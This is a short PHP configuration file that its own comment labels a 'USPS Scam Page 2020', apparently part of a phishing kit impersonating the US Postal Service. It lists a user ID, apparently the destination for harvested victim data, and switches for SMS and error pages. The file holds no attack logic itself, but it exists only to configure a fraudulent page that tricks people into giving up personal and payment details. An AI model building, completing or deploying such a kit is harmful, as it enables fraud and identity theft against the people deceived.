<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("5162841514");
$sms='1';
$error='1';
?>
